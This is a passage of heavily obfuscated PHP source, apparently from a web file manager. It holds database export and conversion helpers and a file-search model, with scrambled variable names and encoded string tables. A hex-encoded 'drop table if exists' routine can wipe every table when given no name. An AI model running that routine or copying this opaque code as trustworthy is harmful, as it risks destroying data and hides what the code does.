return !0; } public function dropTable($¿ƒ‡Í‚á = null) { $î„Øñ¾ = $this->model()->db(); $œ©•Áô = $¿ƒ‡Í‚á ? array($¿ƒ‡Í‚á) : $î„Øñ¾->getTables(); if (!$œ©•Áô) { return; } foreach ($œ©•Áô as $¿ƒ‡Í‚á) { if ($¿ƒ‡Í‚á) { $¿ƒ‡Í‚á = strtolower($¿ƒ‡Í‚á); } else { continue; } $î„Øñ¾->execute("\x64\x72\157\x70\40\164\141\x62\154\145\x20\151\x66\x20\145\x78\151\x73\x74\163\x20\x60{$¿ƒ‡Í‚á}\140"); } } private function sqlEncode($äİÉ–ìß) { $À³€ËÛò =& $_SERVER[ú÷îèÆÜ]; $÷¯§Ïö = array(); foreach ($äİÉ–ìß as $¯µí¶ä) { if (is_array($¯µí¶ä)) { $¯µí¶ä = json_encode_force($¯µí¶ä); } $¯µí¶ä = addslashes($¯µí¶ä); $¯µí¶ä = str_replace(array($À³€ËÛò[1119], $À³€ËÛò[11]), array($À³€ËÛò[1120], $À³€ËÛò[1121]), $¯µí¶ä); $÷¯§Ïö[] = str_replace($À³€ËÛò[68], $À³€ËÛò[1122], $¯µí¶ä); } return $À³€ËÛò[68] . implode($À³€ËÛò[1123], $÷¯§Ïö) . $À³€ËÛò[68]; } private function sqlDecode($„úƒ¾¿…, $¯¨¦•éÕ, $ıëáÓàû = '') { $«°£ùÅí =& $_SERVER[ú÷îèÆÜ]; $„úƒ¾¿… = str_replace(array($«°£ùÅí[1120], $«°£ùÅí[1121]), array($«°£ùÅí[1119], $«°£ùÅí[11]), $„úƒ¾¿…); if ($¯¨¦•éÕ == $«°£ùÅí[23]) { return $ıëáÓàû != $«°£ùÅí[1124] ? stripslashes($„úƒ¾¿…) : $„úƒ¾¿…; } if ($ıëáÓàû == $«°£ùÅí[1124]) { $„úƒ¾¿… = str_replace($«°£ùÅí[1125], $«°£ùÅí[128], stripslashes($„úƒ¾¿…)); } return $„úƒ¾¿…; } public function getSqlFile($ä¾È²æ¾ = '') { $­ôÂâÛË =& $_SERVER[ú÷îèÆÜ]; $Õ®¬·”¾ = $this->dbType(!0); $¯Šàş¸ = CONTROLLER_DIR . "\x69\x6e\163\164\141\x6c\x6c\x2f\144\141\x74\141\57{$Õ®¬·”¾}\56\163\161\x6c"; $õºû’ó = file_get_contents($¯Šàş¸); $İ´ÛÏò = $­ôÂâÛË[1126] . ($Õ®¬·”¾ == $­ôÂâÛË[844] ? $­ôÂâÛË[1127] : $­ôÂâÛË[1128]) . $­ôÂâÛË[1129]; preg_match_all($İ´ÛÏò, $õºû’ó, $º“ù¸¨­); $€ÓòŸ‰Ä = $º“ù¸¨­[1]; $‹ŞÑô˜ = $this->model()->db(); $Û°²°»µ = $‹ŞÑô˜->getTables(); $‰€ô¥Öë = TEMP_FILES . $­ôÂâÛË[1130] . date($­ôÂâÛË[264]) . $­ôÂâÛË[18]; del_dir($‰€ô¥Öë); mk_dir($‰€ô¥Öë); $±šŸö« = $‰€ô¥Öë . $­ôÂâÛË[1131]; $‹ÏÒşéÔ = $‰€ô¥Öë . $­ôÂâÛË[1132]; $æ“šˆŠ = $Õ®¬·”¾ == $­ôÂâÛË[23] ? $­ôÂâÛË[844] : $­ôÂâÛË[23]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\164\141\x6c\x6c\x2f\x64\141\x74\141\x2f{$æ“šˆŠ}\x2e\x73\x71\x6c", $‰€ô¥Öë); @touch($‰€ô¥Öë . $Õ®¬·”¾ . $­ôÂâÛË[828]); $Í€÷‘†· = fopen($±šŸö«, $­ôÂâÛË[1107]); $ÓÍÖ¢â“ = fopen($‹ÏÒşéÔ, $­ôÂâÛË[1107]); if ($Õ®¬·”¾ == $­ôÂâÛË[23]) { $Û°²°»µ = array_diff($Û°²°»µ, array($­ôÂâÛË[824], $­ôÂâÛË[825])); $»Ø…ˆ• = array($­ôÂâÛË[1133], $­ôÂâÛË[1134], $­ôÂâÛË[1135]); fwrite($ÓÍÖ¢â“, implode(PHP_EOL, $»Ø…ˆ•) . PHP_EOL . PHP_EOL); foreach ($Û°²°»µ as $ßÃ¬”™˜) { $Àåò‚À = $this->sqlFromSqlite($ßÃ¬”™˜); if (!$Àåò‚À[$­ôÂâÛË[23]]) { continue; } fwrite($ÓÍÖ¢â“, $Àåò‚À[$­ôÂâÛË[23]] . PHP_EOL . PHP_EOL); if (!in_array($ßÃ¬”™˜, $€ÓòŸ‰Ä)) { fwrite($Í€÷‘†·, $Àåò‚À[$­ôÂâÛË[844]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Û°²°»µ as $ßÃ¬”™˜) { $Àåò‚À = $this->sqlFromMysql($ßÃ¬”™˜); if (!$Àåò‚À[$­ôÂâÛË[844]]) { continue; } fwrite($Í€÷‘†·, $Àåò‚À[$­ôÂâÛË[844]] . PHP_EOL . PHP_EOL); if (!in_array($ßÃ¬”™˜, $€ÓòŸ‰Ä)) { fwrite($ÓÍÖ¢â“, $Àåò‚À[$­ôÂâÛË[23]] . PHP_EOL . PHP_EOL); } } } fclose($Í€÷‘†·); fclose($ÓÍÖ¢â“); $õºû’ó = array($­ôÂâÛË[844] => $±šŸö«, $­ôÂâÛË[23] => $‹ÏÒşéÔ); return $ä¾È²æ¾ ? $õºû’ó[$ä¾È²æ¾] : $õºû’ó; } public function dbType($ƒ ñëÊÀ = false) { $»‰‰Õ²Ğ =& $_SERVER[ú÷îèÆÜ]; $ËÜæ±  = $ƒ ñëÊÀ ? $GLOBALS[$»‰‰Õ²Ğ[16]][$»‰‰Õ²Ğ[31]] : $this->database; $ËÜæ±  = array_change_key_case($ËÜæ± ); $¿ùŒØæ„ = $ËÜæ± [$»‰‰Õ²Ğ[1008]]; if ($¿ùŒØæ„ == $»‰‰Õ²Ğ[1005]) { $­’Û®í = explode($»‰‰Õ²Ğ[4], $ËÜæ± [$»‰‰Õ²Ğ[1014]]); $¿ùŒØæ„ = $­’Û®í[0]; } $ŠÊÏÕáµ = array($»‰‰Õ²Ğ[1136] => $»‰‰Õ²Ğ[23], $»‰‰Õ²Ğ[953] => $»‰‰Õ²Ğ[844]); if (isset($ŠÊÏÕáµ[$¿ùŒØæ„])) { $¿ùŒØæ„ = $ŠÊÏÕáµ[$¿ùŒØæ„]; } return $¿ùŒØæ„; } public function sqlFromMysql($·Áà€³™, $¸ê«å®ß = '') { $ïĞÄºßÑ =& $_SERVER[ú÷îèÆÜ]; $­Ğ½Ñ¯ = $this->model()->db(); $¸şôü©È = $­Ğ½Ñ¯->query($ïĞÄºßÑ[1137] . $·Áà€³™ . $ïĞÄºßÑ[438]); if (!$¸şôü©È || !$¸şôü©È[0]) { return !1; } $£“•ıÍ = _get($¸şôü©È[0], $ïĞÄºßÑ[1138], $ïĞÄºßÑ[22]); if (!$£“•ıÍ) { return !1; } $¦Ãµ£ò = "\x44\122\117\120\40\x54\x41\102\114\105\40\111\x46\x20\x45\130\111\x53\x54\x53\40\x60{$·Áà€³™}\140\x3b" . PHP_EOL . $£“•ıÍ . $ïĞÄºßÑ[81]; if ($¸ê«å®ß && $¸ê«å®ß == $ïĞÄºßÑ[844]) { return $¦Ãµ£ò; } $í®¯¸…à = array_change_key_case($GLOBALS[$ïĞÄºßÑ[16]][$ïĞÄºßÑ[31]]); $†°²½Ï° = $í®¯¸…à[$ïĞÄºßÑ[1013]]; $ìÚÔí÷Á = $ïĞÄºßÑ[1139] . $†°²½Ï° . $ïĞÄºßÑ[1140] . $·Áà€³™ . $ïĞÄºßÑ[68]; $£³ŒÎê× = $ïĞÄºßÑ[1141] . $·Áà€³™ . $ïĞÄºßÑ[941]; $®˜»Íëå = $­Ğ½Ñ¯->query($ìÚÔí÷Á); if (empty($®˜»Íëå)) { $ÉŸ¶Ê´ù = array($ïĞÄºßÑ[844] => $ïĞÄºßÑ[22], $ïĞÄºßÑ[23] => $ïĞÄºßÑ[22]); return $¸ê«å®ß ? $ÉŸ¶Ê´ù[$¸ê«å®ß] : $ÉŸ¶Ê´ù; } $ Å‚ÍŞ  = $­Ğ½Ñ¯->query($£³ŒÎê×); $¤±²è¨º = $ïĞÄºßÑ[22]; $ĞÕ–—°ã = array(); foreach ($ Å‚ÍŞ  as $¯ûú‰Ú) { if (!$¤±²è¨º && $¯ûú‰Ú[$ïĞÄºßÑ[1142]] == $ïĞÄºßÑ[1143]) { $¤±²è¨º = $¯ûú‰Ú[$ïĞÄºßÑ[1144]]; } if (isset($ĞÕ–—°ã[$¯ûú‰Ú[$ïĞÄºßÑ[1142]]])) { $ĞÕ–—°ã[$¯ûú‰Ú[$ïĞÄºßÑ[1142]]][$ïĞÄºßÑ[1145]][] = $¯ûú‰Ú[$ïĞÄºßÑ[1144]]; continue; } $ĞÕ–—°ã[$¯ûú‰Ú[$ïĞÄºßÑ[1142]]] = array($ïĞÄºßÑ[1146] => $¯ûú‰Ú[$ïĞÄºßÑ[1142]], $ïĞÄºßÑ[1145] => array($¯ûú‰Ú[$ïĞÄºßÑ[1144]]), $ïĞÄºßÑ[1147] => $¯ûú‰Ú[$ïĞÄºßÑ[1148]] == $ïĞÄºßÑ[98] ? 0 : 1); } $ÙÑ˜‘æÎ = array(); foreach ($ĞÕ–—°ã as $¯ûú‰Ú) { $•èÂ½ì™ = $¯ûú‰Ú[$ïĞÄºßÑ[1146]] == $ïĞÄºßÑ[1143]; $ˆü™ÓéÎ = array($ïĞÄºßÑ[1149], $¯ûú‰Ú[$ïĞÄºßÑ[1147]] == $ïĞÄºßÑ[98] && !$•èÂ½ì™ ? $ïĞÄºßÑ[1150] : $ïĞÄºßÑ[22], $ïĞÄºßÑ[1151], $ïĞÄºßÑ[1152] . $·Áà€³™ . $ïĞÄºßÑ[21] . ($•èÂ½ì™ ? $ïĞÄºßÑ[1153] : $¯ûú‰Ú[$ïĞÄºßÑ[1146]]) . $ïĞÄºßÑ[128], $ïĞÄºßÑ[1154], $ïĞÄºßÑ[128] . $·Áà€³™ . $ïĞÄºßÑ[128], $ïĞÄºßÑ[1155] . implode($ïĞÄºßÑ[1156], $¯ûú‰Ú[$ïĞÄºßÑ[1145]]) . $ïĞÄºßÑ[1157]); $ÙÑ˜‘æÎ[] = implode($ïĞÄºßÑ[63], $ˆü™ÓéÎ) . $ïĞÄºßÑ[81]; } $Èšï¢š = array(); $¦ÆÂ¯¼Õ = array($ïĞÄºßÑ[1158] => $ïĞÄºßÑ[1159], $ïĞÄºßÑ[1159] => $ïĞÄºßÑ[1159], $ïĞÄºßÑ[341] => $ïĞÄºßÑ[368], $ïĞÄºßÑ[340] => $ïĞÄºßÑ[368]); foreach ($®˜»Íëå as $¯ûú‰Ú) { $ˆü™ÓéÎ = array($ïĞÄºßÑ[128] . $¯ûú‰Ú[$ïĞÄºßÑ[1160]] . $ïĞÄºßÑ[128], isset($¦ÆÂ¯¼Õ[$¯ûú‰Ú[$ïĞÄºßÑ[1161]]]) ? $¦ÆÂ¯¼Õ[$¯ûú‰Ú[$ïĞÄºßÑ[1161]]] : $¯ûú‰Ú[$ïĞÄºßÑ[1162]], $¯ûú‰Ú[$ïĞÄºßÑ[1163]] == $ïĞÄºßÑ[939] ? $ïĞÄºßÑ[1164] : $ïĞÄºßÑ[1165], $¯ûú‰Ú[$ïĞÄºßÑ[1160]] == $¤±²è¨º ? $ïĞÄºßÑ[1166] : $ïĞÄºßÑ[22], $¯ûú‰Ú[$ïĞÄºßÑ[990]] ? strtoupper(str_replace($ïĞÄºßÑ[21], $ïĞÄºßÑ[22], $¯ûú‰Ú[$ïĞÄºßÑ[990]])) : $ïĞÄºßÑ[22]); $Èšï¢š[] = trim(implode($ïĞÄºßÑ[63], $ˆü™ÓéÎ)); } $Ûèö­Î = array($ïĞÄºßÑ[1167] . $·Áà€³™ . $ïĞÄºßÑ[1168], $ïĞÄºßÑ[1169] . $·Áà€³™ . $ïĞÄºßÑ[1170], implode($ïĞÄºßÑ[60] . PHP_EOL, $Èšï¢š), $ïĞÄºßÑ[987]); $åõæ‹‰È = implode(PHP_EOL, array_merge($Ûèö­Î, $ÙÑ˜‘æÎ)); if ($¸ê«å®ß && $¸ê«å®ß == $ïĞÄºßÑ[23]) { return $åõæ‹‰È; } $ÉŸ¶Ê´ù = array($ïĞÄºßÑ[844] => $¦Ãµ£ò, $ïĞÄºßÑ[23] => $åõæ‹‰È); return $¸ê«å®ß ? $ÉŸ¶Ê´ù[$¸ê«å®ß] : $ÉŸ¶Ê´ù; } public function sqlFromSqlite($¶»ÉÎ¼Ã, $Ó§¹Ì¡Ú = '') { $Éˆşôì =& $_SERVER[ú÷îèÆÜ]; $³À›¤‚æ = $this->model()->db(); $ò”äüŸÓ = "\x50\122\x41\107\115\x41\x20\x54\x41\x42\x4c\105\x5f\x49\x4e\106\117\40\x28\47{$¶»ÉÎ¼Ã}\x27\x29"; $ß«®å = "\123\105\x4c\x45\103\124\40\x2a\40\x46\122\117\x4d\40\163\161\154\151\164\145\137\155\x61\x73\x74\145\162\40\x57\110\105\122\x45\40\164\142\154\137\156\141\155\145\x20\75\x20\47{$¶»ÉÎ¼Ã}\x27"; $¿Ú¥ªõ† = $³À›¤‚æ->query($ò”äüŸÓ); if (empty($¿Ú¥ªõ†)) { $ä‚ûŒ¥Ê = array($Éˆşôì[844] => $Éˆşôì[22], $Éˆşôì[23] => $Éˆşôì[22]); return $Ó§¹Ì¡Ú ? $ä‚ûŒ¥Ê[$Ó§¹Ì¡Ú] : $ä‚ûŒ¥Ê; } $´ÓğŞèï = $³À›¤‚æ->query($ß«®å); $½ßïº² = $É„œ » = array(); foreach ($´ÓğŞèï as $ŸÛëÁ¸) { if ($ŸÛëÁ¸[$Éˆşôì[43]] == $Éˆşôì[332]) { $½ßïº²[] = $ŸÛëÁ¸[$Éˆşôì[1171]]; } else { $É„œ »[$ŸÛëÁ¸[$Éˆşôì[42]]] = $ŸÛëÁ¸[$Éˆşôì[1171]]; } } $ÅÜ´”ßÑ = array_merge(array($Éˆşôì[1167] . $¶»ÉÎ¼Ã . $Éˆşôì[128]), $½ßïº², array_values($É„œ »)); $ÅÜ´”ßÑ = implode($Éˆşôì[81] . PHP_EOL, $ÅÜ´”ßÑ) . $Éˆşôì[81]; if ($Ó§¹Ì¡Ú && $Ó§¹Ì¡Ú == $Éˆşôì[23]) { return $ÅÜ´”ßÑ; } $˜‚¶Ú‚Ú = array(); $·«¶ş˜ = array($Éˆşôì[1159] => $Éˆşôì[1172], $Éˆşôì[368] => $Éˆşôì[1173]); $ñÑñ±Ü = $Éˆşôì[22]; foreach ($¿Ú¥ªõ† as $ŸÛëÁ¸) { if ($ŸÛëÁ¸[$Éˆşôì[67]] == $Éˆşôì[98]) { $ñÑñ±Ü = $ŸÛëÁ¸[$Éˆşôì[42]]; } $”­öÃ˜‡ = array($Éˆşôì[438] . $ŸÛëÁ¸[$Éˆşôì[42]] . $Éˆşôì[438], isset($·«¶ş˜[$ŸÛëÁ¸[$Éˆşôì[43]]]) ? $·«¶ş˜[$ŸÛëÁ¸[$Éˆşôì[43]]] : $ŸÛëÁ¸[$Éˆşôì[43]], $ŸÛëÁ¸[$Éˆşôì[45]] == $Éˆşôì[98] ? $Éˆşôì[1164] : $Éˆşôì[1174] . $ŸÛëÁ¸[$Éˆşôì[66]], $ŸÛëÁ¸[$Éˆşôì[67]] == $Éˆşôì[98] ? $Éˆşôì[1175] : $Éˆşôì[22]); $˜‚¶Ú‚Ú[] = trim(implode($Éˆşôì[63], $”­öÃ˜‡)); } foreach ($É„œ » as $éØ²Èƒ => $µñ°¦êú) { $ÉÌüÀå = str_replace($Éˆşôì[1176] . $¶»ÉÎ¼Ã . $Éˆşôì[21], $Éˆşôì[22], $éØ²Èƒ); $º›‚ÄŞ = str_replace(array($Éˆşôì[128], $Éˆşôì[998]), $Éˆşôì[438], substr($µñ°¦êú, stripos($µñ°¦êú, $Éˆşôì[313]))); if ($ÉÌüÀå == $Éˆşôì[1153]) { $úÉî€Å = $Éˆşôì[1177] . $ñÑñ±Ü . $Éˆşôì[1178]; } else { $úÉî€Å = (stripos($ÉÌüÀå, $Éˆşôì[21]) ? $Éˆşôì[1179] : $Éˆşôì[22]) . ($Éˆşôì[1180] . $ÉÌüÀå . $Éˆşôì[1181] . $º›‚ÄŞ); } $˜‚¶Ú‚Ú[] = $úÉî€Å; } $É•üÔš» = array($Éˆşôì[1182] . $¶»ÉÎ¼Ã . $Éˆşôì[1183], $Éˆşôì[1184] . $¶»ÉÎ¼Ã . $Éˆşôì[1185], implode($Éˆşôì[60] . PHP_EOL, $˜‚¶Ú‚Ú), $Éˆşôì[1186]); $Áİ¸˜ì× = implode(PHP_EOL, $É•üÔš»); if ($Ó§¹Ì¡Ú && $Ó§¹Ì¡Ú == $Éˆşôì[844]) { return $Áİ¸˜ì×; } $ä‚ûŒ¥Ê = array($Éˆşôì[844] => $Áİ¸˜ì×, $Éˆşôì[23] => $ÅÜ´”ßÑ); return $Ó§¹Ì¡Ú ? $ä‚ûŒ¥Ê[$Ó§¹Ì¡Ú] : $ä‚ûŒ¥Ê; } } goto DŞÃé¢¼˜ß; aŠÙ›½Œ¾Ó: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($˜üŒİù) { $„ÊäÈÍı =& $_SERVER[ú÷îèÆÜ]; $Æ•ÆˆŒø = KodIO::fileTypeList(); $ÖŠŒŸ¯£ = $Æ•ÆˆŒø[$˜üŒİù]; if (!$ÖŠŒŸ¯£) { return array(); } $Şã×Ê±º = $ÖŠŒŸ¯£[$„ÊäÈÍı[185]]; $÷§»‚ÌÎ = $„ÊäÈÍı[17]; if (!$ÖŠŒŸ¯£[$„ÊäÈÍı[185]]) { $‹ŠŸÅÇ = array_to_keyvalue($Æ•ÆˆŒø, $„ÊäÈÍı[22], $„ÊäÈÍı[185]); $Şã×Ê±º = implode($„ÊäÈÍı[60], $‹ŠŸÅÇ); $÷§»‚ÌÎ = $„ÊäÈÍı[2139]; } $‹–ÏÉµÅ = explode($„ÊäÈÍı[60], trim($Şã×Ê±º, $„ÊäÈÍı[60])); return array($÷§»‚ÌÎ, $‹–ÏÉµÅ); } public function listPathType($õÌç¸ÅÚ) { $™‚àî =& $_SERVER[ú÷îèÆÜ]; $Ï­Ğ»š = $this->fileTypeWhere($õÌç¸ÅÚ); if (!$Ï­Ğ»š) { return array(); } $Òæ¯Ø¨¨ = USER_ID; $ÛàŒ¶È = Model($™‚àî[576])->getInfo($Òæ¯Ø¨¨); $Ä ¿äìó = array($™‚àî[625] => SourceModel::TYPE_USER, $™‚àî[562] => array($™‚àî[589], $™‚àî[572] . $ÛàŒ¶È[$™‚àî[97]][$™‚àî[191]] . $™‚àî[590]), $™‚àî[626] => $Òæ¯Ø¨¨, $™‚àî[623] => 0, $™‚àî[624] => $Ï­Ğ»š); return $this->listSource($Ä ¿äìó); } public function listSearch($¢ãà—Á, $×ô‹ğ£ = 300) { $£ÉäşÄ =& $_SERVER[ú÷îèÆÜ]; if (isset($¢ãà—Á[$£ÉäşÄ[1977]]) && $¢ãà—Á[$£ÉäşÄ[1977]]) { $¢ãà—Á[$£ÉäşÄ[1977]] = str_replace($£ÉäşÄ[437], $£ÉäşÄ[2140], trim($¢ãà—Á[$£ÉäşÄ[1977]])); } $ÃóÌ³ÜÉ = $this->_parseSearchWhere($¢ãà—Á); if (!isset($ÃóÌ³ÜÉ[$£ÉäşÄ[482]])) { $ÃóÌ³ÜÉ[$£ÉäşÄ[482]] = 0; } $×ŠëúÓå = $£ÉäşÄ[2141]; $’õ¡˜ˆƒ = $ÃóÌ³ÜÉ; $âÏ‰Ã® = $×ŠëúÓå; $this->_listSearchBindPinyin($¢ãà—Á, $ÃóÌ³ÜÉ, $×ŠëúÓå); $this->alias($£ÉäşÄ[496])->_makeOrder(); $ÃóÌ³ÜÉ = $this->parseWhereLike($ÃóÌ³ÜÉ); $ï™Ï¢¸è = $this->distinct(!0)->field($×ŠëúÓå)->where($ÃóÌ³ÜÉ)->selectPage($×ô‹ğ£); if ($GLOBALS[$£ÉäşÄ[16]][$£ÉäşÄ[434]][$£ÉäşÄ[435]] && Input::check($¢ãà—Á[$£ÉäşÄ[1977]], $£ÉäşÄ[632]) && $ï™Ï¢¸è[$£ÉäşÄ[419]][$£ÉäşÄ[406]] == 1 && $ï™Ï¢¸è[$£ÉäşÄ[419]][$£ÉäşÄ[420]] == 0) { $ï™Ï¢¸è = $this->distinct(!0)->field($×ŠëúÓå)->where($’õ¡˜ˆƒ)->limit(1000)->select(); $ï™Ï¢¸è = array_page_split($ï™Ï¢¸è, !1, $×ô‹ğ£); } $this->_listSearchFileContent($ï™Ï¢¸è, $¢ãà—Á, $âÏ‰Ã®, $’õ¡˜ˆƒ); $this->_listSearchDesc($ï™Ï¢¸è, $¢ãà—Á, $âÏ‰Ã®); $this->_listSearchTag($ï™Ï¢¸è, $¢ãà—Á, $âÏ‰Ã®); $this->_listSearchGroupTag($ï™Ï¢¸è, $¢ãà—Á, $âÏ‰Ã®); $this->_listDataApply($ï™Ï¢¸è[$£ÉäşÄ[422]]); $this->_listMake($ï™Ï¢¸è); return $ï™Ï¢¸è; } private function _listSearchFileContent(&$‰˜ñå§§, $­ôÍ§¬ˆ, $ôæÆİÆÄ, $Ä‹µëê¬) { $éèîäŒ‡ =& $_SERVER[ú÷îèÆÜ]; if (!$­ôÍ§¬ˆ[$éèîäŒ‡[1977]] || $‰˜ñå§§[$éèîäŒ‡[419]][$éèîäŒ‡[406]] > 1) { return; } if (!isset($Ä‹µëê¬[$éèîäŒ‡[42]]) || !is_array($­ôÍ§¬ˆ[$éèîäŒ‡[518]])) { return; } $Ä‹µëê¬[$éèîäŒ‡[518]] = array($éèîäŒ‡[17], $­ôÍ§¬ˆ[$éèîäŒ‡[518]]); unset($Ä‹µëê¬[$éèîäŒ‡[42]]); unset($­ôÍ§¬ˆ[$éèîäŒ‡[518]]); $”Ìà“æù = $this->field($ôæÆİÆÄ)->where($Ä‹µëê¬)->limit($éèîäŒ‡[2142])->select(); if (!$”Ìà“æù || count($”Ìà“æù) == 0) { return; } $‰˜ñå§§[$éèîäŒ‡[422]] = array_merge($”Ìà“æù, $‰˜ñå§§[$éèîäŒ‡[422]]); $‰˜ñå§§[$éèîäŒ‡[419]][$éèîäŒ‡[420]] += count($”Ìà“æù); } private function _listSearchTag(&$†é…¸¯‘, $•‹°–½å, $ÛÈÎåì) { $ßÎ‘Ø±â =& $_SERVER[ú÷îèÆÜ]; if (!$•‹°–½å[$ßÎ‘Ø±â[1977]] || $†é…¸¯‘[$ßÎ‘Ø±â[419]][$ßÎ‘Ø±â[406]] > 1) { return; } $°¬£ïƒ = Model($ßÎ‘Ø±â[2143])->listData(); $¨àÅ¾û = array(); $¥ø–…¿É = $•‹°–½å[$ßÎ‘Ø±â[1977]]; foreach ($°¬£ïƒ as $é¯òÀš„) { $ïÜ·ì¥ = $é¯òÀš„[$ßÎ‘Ø±â[42]]; $¾ªœ˜¥å = str_replace($ßÎ‘Ø±â[63], $ßÎ‘Ø±â[22], Pinyin::get($ïÜ·ì¥)); if (stripos($ïÜ·ì¥, $¥ø–…¿É) !== !1 || stripos($¾ªœ˜¥å, $¥ø–…¿É) !== !1) { $¨àÅ¾û[] = $é¯òÀš„[$ßÎ‘Ø±â[452]]; } } if (!$¨àÅ¾û) { return; } $æ¹ÅÕìŠ = array($ßÎ‘Ø±â[477] => array($ßÎ‘Ø±â[17], $¨àÅ¾û), $ßÎ‘Ø±â[1685] => USER_ID); $²‰Œßõ = Model($ßÎ‘Ø±â[479])->field($ßÎ‘Ø±â[94])->where($æ¹ÅÕìŠ)->select(); $²‰Œßõ = array_to_keyvalue($²‰Œßõ, $ßÎ‘Ø±â[22], $ßÎ‘Ø±â[94]); $Ä‰é©û× = array_unique($²‰Œßõ); $this->_listSearchMerge($†é…¸¯‘, $•‹°–½å, $ÛÈÎåì, $Ä‰é©û×); } private function _listSearchDesc(&$õíªîşµ, $——õ¾ğŠ, $Û´ÓÖÓ‹) { $¾ˆ·ÄÇâ =& $_SERVER[ú÷îèÆÜ]; if (!$——õ¾ğŠ[$¾ˆ·ÄÇâ[1977]] || $õíªîşµ[$¾ˆ·ÄÇâ[419]][$¾ˆ·ÄÇâ[406]] > 1) { return; } $¨ñ™û É = array($¾ˆ·ÄÇâ[104] => $¾ˆ·ÄÇâ[503], $¾ˆ·ÄÇâ[427] => array($¾ˆ·ÄÇâ[436], $¾ˆ·ÄÇâ[1979] . $——õ¾ğŠ[$¾ˆ·ÄÇâ[1977]] . $¾ˆ·ÄÇâ[1979])); $îÔÇü¸ò = !1; if ($îÔÇü¸ò) { $“ƒã¿ = $this->listSearchChildren($——õ¾ğŠ[$¾ˆ·ÄÇâ[190]]); $“ƒã¿ = array_unique($“ƒã¿); if (!$“ƒã¿) { return; } $¨ñ™û É[$¾ˆ·ÄÇâ[191]] = array($¾ˆ·ÄÇâ[17], $“ƒã¿); } $î€ø€¢ = Model($¾ˆ·ÄÇâ[609])->field($¾ˆ·ÄÇâ[191])->where($¨ñ™û É)->limit(5000)->select(); $Ñü×ª¤ = array_to_keyvalue($î€ø€¢, $¾ˆ·ÄÇâ[22], $¾ˆ·ÄÇâ[191]); $this->_listSearchMerge($õíªîşµ, $——õ¾ğŠ, $Û´ÓÖÓ‹, $Ñü×ª¤); } private function _listSearchGroupTag(&$²‹øÊ›, $¬ì¾ÕĞŠ, $äè•Õ“û) { $ä‚Ù†èÌ =& $_SERVER[ú÷îèÆÜ]; if (!$¬ì¾ÕĞŠ[$ä‚Ù†èÌ[1977]] || $²‹øÊ›[$ä‚Ù†èÌ[419]][$ä‚Ù†èÌ[406]] > 1 || !$¬ì¾ÕĞŠ[$ä‚Ù†èÌ[190]]) { return; } $õØ«ò‚‡ = $this->sourceInfo($¬ì¾ÕĞŠ[$ä‚Ù†èÌ[190]]); if (!$õØ«ò‚‡ || $õØ«ò‚‡[$ä‚Ù†èÌ[188]] != SourceModel::TYPE_GROUP) { return; } $ÂÁ˜´á = $õØ«ò‚‡[$ä‚Ù†èÌ[547]]; $ÛÇ¾â¡½ = Model($ä‚Ù†èÌ[2144])->get($ÂÁ˜´á); $¹Ïş¶Äì = array(); $‰Í±Å² = $¬ì¾ÕĞŠ[$ä‚Ù†èÌ[1977]]; foreach ($ÛÇ¾â¡½[$ä‚Ù†èÌ[422]] as $ÔöüôÑ) { $‰‰ÌÇ¤è = $ÔöüôÑ[$ä‚Ù†èÌ[42]]; $†•… = str_replace($ä‚Ù†èÌ[63], $ä‚Ù†èÌ[22], Pinyin::get($‰‰ÌÇ¤è)); if (stripos($‰‰ÌÇ¤è, $‰Í±Å²) !== !1 || stripos($†•…, $‰Í±Å²) !== !1) { $¹Ïş¶Äì[] = $ÔöüôÑ[$ä‚Ù†èÌ[452]]; } } if (!$¹Ïş¶Äì) { return; } $ÅŸ×“øƒ = array($ä‚Ù†èÌ[477] => array($ä‚Ù†èÌ[17], $¹Ïş¶Äì), $ä‚Ù†èÌ[1685] => 0, $ä‚Ù†èÌ[43] => $ä‚Ù†èÌ[1999] . $ÂÁ˜´á); $ı¨æ¿æ‡ = Model($ä‚Ù†èÌ[479])->field($ä‚Ù†èÌ[94])->where($ÅŸ×“øƒ)->select(); $ı¨æ¿æ‡ = array_to_keyvalue($ı¨æ¿æ‡, $ä‚Ù†èÌ[22], $ä‚Ù†èÌ[94]); $Ë‡´ÁÈÌ = array_unique($ı¨æ¿æ‡); $this->_listSearchMerge($²‹øÊ›, $¬ì¾ÕĞŠ, $äè•Õ“û, $Ë‡´ÁÈÌ); } private function _listSearchMerge(&$ ë–¦“, $šÌˆÔÁº, $´÷¤Æ½Ñ, $ÌŸª¸®©) { $¸çñ„³ =& $_SERVER[ú÷îèÆÜ]; if (!$ÌŸª¸®©) { return; } $ÖÔìæğ = array_to_keyvalue($ ë–¦“[$¸çñ„³[422]], $¸çñ„³[22], $¸çñ„³[191]); $³ÚÈè¦Ò = array_diff($ÌŸª¸®©, $ÖÔìæğ); if (!$³ÚÈè¦Ò) { return; } $Ï¢Ëú‡ = array($¸çñ„³[191] => array($¸çñ„³[17], $³ÚÈè¦Ò)); $Ò€¼ŞğØ = $this->field($´÷¤Æ½Ñ)->where($Ï¢Ëú‡)->select(); if (!$Ò€¼ŞğØ) { return; } $Ñ°Í£çÖ = array(); foreach ($Ò€¼ŞğØ as $ä¬¥êÅµ) { if ($this->_listSearchFilter($ä¬¥êÅµ, $šÌˆÔÁº)) { $Ñ°Í£çÖ[] = $ä¬¥êÅµ; } } $ ë–¦“[$¸çñ„³[422]] = array_merge($Ñ°Í£çÖ, $ ë–¦“[$¸çñ„³[422]]); $ ë–¦“[$¸çñ„³[419]][$¸çñ„³[420]] += count($Ñ°Í£çÖ); } private function _listSearchFilter($¿„©×É£, $”È£¶à») { $ßå•“‰¼ =& $_SERVER[ú÷îèÆÜ]; $àØÜà® = $¿„©×É£[$ßå•“‰¼[462]] == $ßå•“‰¼[98]; if (!strstr($¿„©×É£[$ßå•“‰¼[562]], $ßå•“‰¼[60] . $”È£¶à»[$ßå•“‰¼[190]] . $ßå•“‰¼[60])) { return !1; } if (isset($”È£¶à»[$ßå•“‰¼[463]]) && $”È£¶à»[$ßå•“‰¼[463]] != $ßå•“‰¼[1938]) { if ($”È£¶à»[$ßå•“‰¼[463]] == $ßå•“‰¼[85] && !$àØÜà®) { return !1; } if ($”È£¶à»[$ßå•“‰¼[463]] != $ßå•“‰¼[85] && $àØÜà®) { return !1; } if (!strstr($¿„©×É£[$ßå•“‰¼[185]], $ßå•“‰¼[60] . $”È£¶à»[$ßå•“‰¼[463]] . $ßå•“‰¼[60])) { return !1; } } if (isset($”È£¶à»[$ßå•“‰¼[2145]]) && 